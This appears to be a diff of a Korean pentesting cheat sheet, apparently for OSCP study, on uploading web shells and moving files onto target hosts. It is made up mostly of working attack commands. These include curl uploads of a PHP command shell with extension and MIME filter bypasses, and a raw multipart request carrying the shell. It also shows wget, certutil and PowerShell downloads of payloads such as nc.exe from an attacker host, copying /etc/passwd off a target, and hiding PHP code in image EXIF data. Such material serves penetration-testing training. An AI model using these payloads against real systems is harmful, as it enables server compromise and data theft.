@@ -1,103 +1,99 @@
-# 파일 업로드 기법 (OSCP 시험용)
+# 파일 업로드/다운로드 기법
 
-## curl - 웹사이트 파일 업로드
+## curl로 웹 업로드
 
 ```bash
-# ★ 중요: @는 로컬파일 지정자임!!! 절대 빼먹지 말것 ★
+# 기본 파일 업로드 (@는 로컬파일 지정자)
+curl -F "file=@shell.php" http://target.com/upload.php
+curl -F "fileToUpload=@shell.php" http://target.com/upload.php
 
-# 기본 업로드 - 대부분의 웹폼에서 동작
-curl -F "file=@/home/kali/shell.php" http://10.10.10.10/upload.php
-curl -F "fileToUpload=@./shell.php" http://10.10.10.10/upload.php
+# 디버그 모드
+curl -v -F "file=@shell.php" http://target.com/upload.php
 
-# -v로 전체 HTTP 요청/응답 보기
-curl -v -F "file=@./shell.php" http://10.10.10.10/upload.php
+# 필드 여러개 보내기
+curl -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php
 
-# 다른 필드값 추가 (웹폼 분석해서 필요한 항목 추가)
-curl -F "file=@./shell.php" -F "token=1234" -F "submit=Upload" http://10.10.10.10/upload.php
-
-# 파일명 변경 (확장자 필터링 우회)
-curl -F "file=@./shell.php;filename=shell.jpg" http://10.10.10.10/upload.php
-
-# 타입 변경 (MIME 타입 필터링 우회)
-curl -F "file=@./shell.php;type=image/jpeg" http://10.10.10.10/upload.php
-
-# 헤더 추가 (인증 필요한 경우)
-curl -F "file=@./shell.php" -H "Cookie: PHPSESSID=4je2f1o3m2df" http://10.10.10.10/upload.php
+# 우회 기법
+curl -F "file=@shell.php;filename=shell.jpg" http://target.com/upload.php  # 파일명 변경
+curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload.php     # MIME 타입 변경
+curl -F "file=@shell.php" -F "MAX_FILE_SIZE=10000000" http://target.com/upload.php # 파일크기 제한 우회
 ```
 
-## 수동 HTTP 요청 작성 (BurpSuite에서 사용)
+## HTTP 멀티파트 요청 수동 작성 (Burp Suite)
 
 ```
 POST /upload.php HTTP/1.1
-Host: 10.10.10.10
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
-Content-Length: 236
+Host: target.com
+Content-Type: multipart/form-data; boundary=----ABC123
+Content-Length: 235
 
-------WebKitFormBoundary
+------ABC123
 Content-Disposition: form-data; name="file"; filename="shell.php"
 Content-Type: application/x-php
 
 <?php system($_GET['cmd']); ?>
-------WebKitFormBoundary--
+------ABC123--
 ```
 
-## 파일 전송 방법 (내 PC → 타겟)
+## 파일 전송 방법
 
-### 방법1: 웹서버 + wget/curl (가장 많이 씀!!!)
+### 방법1: 웹서버 + wget/curl
 
 ```bash
-# 1. 공격자 PC에서 웹서버 실행
-cd /home/kali/payloads    # 전송할 파일이 있는 폴더로 이동
-python3 -m http.server 80 # 80포트로 서버열기 (sudo 필요)
+# 공격자 PC에서 웹서버 실행
+cd /path/to/files
+python3 -m http.server 8000
+python2 -m SimpleHTTPServer 8000
+php -S 0.0.0.0:8000
 
-# 2. 타겟에서 내 파일 다운받기
-wget http://내IP/shell.php       # wget으로 다운로드
-curl -O http://내IP/shell.php     # curl로 다운로드
-certutil -urlcache -f http://내IP/shell.exe shell.exe  # Windows에서
+# 타겟에서 다운로드
+wget http://10.10.14.x/shell.php
+curl -O http://10.10.14.x/shell.php
+wget http://10.10.14.x/shell.php -O /tmp/shell.php  # 경로 지정
+
+# Windows에서
+certutil -urlcache -f http://10.10.14.x/nc.exe nc.exe
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.x/nc.exe', 'nc.exe')"
+powershell wget http://10.10.14.x/nc.exe -OutFile nc.exe
 ```
 
-### 방법2: SCP (SSH 접근 가능할 때)
+### 방법2: SCP/SFTP (SSH 가능할 때)
 
 ```bash
 # 내 PC → 타겟
-scp ./shell.php user@10.10.10.10:/tmp/
-scp -P 2222 ./shell.php user@10.10.10.10:/var/www/html/  # 포트지정
+scp shell.php user@10.10.10.x:/tmp/
+scp -P 2222 shell.php user@10.10.10.x:/var/www/
 
-# 타겟 → 내 PC (데이터 빼올 때)
-scp user@10.10.10.10:/etc/passwd ./evidence/
+# 타겟 → 내 PC
+scp user@10.10.10.x:/etc/passwd ./
 ```
 
-### 방법3: NC (방화벽 우회에 유용)
+### 방법3: Netcat
 
 ```bash
-# 타겟에서 받기 모드
-nc -lvp 4444 > shell.php
+# 수신측(타겟)
+nc -lvnp 4444 > shell.php
 
-# 내 PC에서 보내기
-nc 10.10.10.10 4444 < shell.php
+# 송신측(공격자)
+nc 10.10.10.x 4444 < shell.php
 
-# 바이너리 파일은 (압축해서 전송)
-# 내 PC에서:
-tar -cf - shell.bin | nc 10.10.10.10 4444
-# 타겟에서:
-nc -lvp 4444 | tar -xf -
+# 바이너리는 압축해서
+# 송신측
+tar -cf - shell.bin | nc 10.10.10.x 4444
+# 수신측
+nc -lvnp 4444 | tar -xf -
 ```
 
-### 방법4: 기타 전송방법
+### 방법4: Base64 활용
 
 ```bash
-# FTP 서버 사용 (익명 로그인 허용시)
-ftp 10.10.10.10
-> put shell.php
-
-# PHP 웹쉘에서 (이미 RCE가 있을 때)
-echo "<?php file_put_contents('shell.php', file_get_contents('http://내IP/shell.php')); ?>"
-
-# Base64로 전송 (작은 파일)
-# 1. 내 PC에서 인코딩
+# 1. 공격자 PC에서 인코딩
 base64 -w 0 shell.php
+
 # 2. 타겟에서 디코딩
-echo "base64문자열" | base64 -d > shell.php
+echo "base64문자열..." | base64 -d > shell.php
+```
+
 ```
 
 ## 업로드 필터 우회 기법 (시험에서 자주 나옴!)
@@ -105,31 +101,39 @@ echo "base64문자열" | base64 -d > shell.php
 ### 1. 확장자 필터링 우회
 
 ```
+
 # 시도해볼 트릭 목록
-shell.php → shell.php.jpg  (이중 확장자)
-shell.php → shell.pHp      (대소문자)
-shell.php → shell.phtml    (대체 확장자)
-shell.php → shell.PHP5     (다른 버전)
-shell.php → shell.php.      (점 추가)
-shell.php → "shell.php "    (공백 추가)
-shell.php → shell.php;.jpg  (세미콜론)
-shell.php → shell.ph\x70   (16진수 인코딩)
+
+shell.php → shell.php.jpg (이중 확장자)
+shell.php → shell.pHp (대소문자)
+shell.php → shell.phtml (대체 확장자)
+shell.php → shell.PHP5 (다른 버전)
+shell.php → shell.php. (점 추가)
+shell.php → "shell.php " (공백 추가)
+shell.php → shell.php;.jpg (세미콜론)
+shell.php → shell.ph\x70 (16진수 인코딩)
 
 # 널바이트 삽입 (PHP 5.3.4 미만)
+
 shell.php → shell.php%00.jpg
+
 ```
 
 ### 2. MIME 타입 변조 (Burp에서 변경)
 
 ```
+
 # 원래 값
+
 Content-Type: application/x-php
 
 # 변경할 값 (이미지처럼 속이기)
+
 Content-Type: image/jpeg
 Content-Type: image/png
 Content-Type: image/gif
-```
+
+````
 
 ### 3. 매직바이트/시그니처 속이기
 
@@ -144,7 +148,7 @@ cat header.jpg shell.php > shell.jpg.php
 # 이미지에 PHP 코드 숨기기
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
 mv image.jpg shell.php.jpg
-```
+````
 
 ### 4. 클라이언트 측 검사 우회
 
